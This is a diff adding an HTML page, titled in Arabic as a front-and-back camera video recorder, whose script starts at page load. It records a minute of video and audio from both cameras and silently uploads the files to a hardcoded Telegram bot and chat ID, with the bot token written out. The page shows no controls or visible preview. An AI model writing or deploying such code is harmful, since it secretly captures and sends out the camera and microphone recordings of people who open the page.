@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل فيديو بالكاميرا الأمامية والخلفية</title>
+</head>
+<body>
+    
+    <script>
+        function startRecording(facingMode, containerId, videoFileName) {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode },
+                audio: true
+            })
+            .then(stream => {
+                const container = document.getElementById(containerId);
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                video.style.width = "100%";
+                container.appendChild(video);
+
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, videoFileName);
+
+                    const telegramBotToken = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw'; // أدخل رمز البوت
+                    const chatId = '1832658980'; // أدخل معرف الدردشة
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
+                        alert(`تم إرسال الفيديو (${videoFileName}) إلى Telegram بنجاح!`);
+                    })
+                    .catch(error => {
+                        console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);
+                        alert(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}).`);
+                    });
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1 * 60 * 1000); // مدة التسجيل دقيقة واحدة
+            })
+            .catch(error => {
+                console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
+                alert(`لا يمكن الوصول إلى الكاميرا (${facingMode}).`);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startRecording('user', 'frontVideoContainer', 'front_recording.webm');
+            startRecording('environment', 'backVideoContainer', 'back_recording.webm');
+        });
+    </script>
+</body>
+</html>
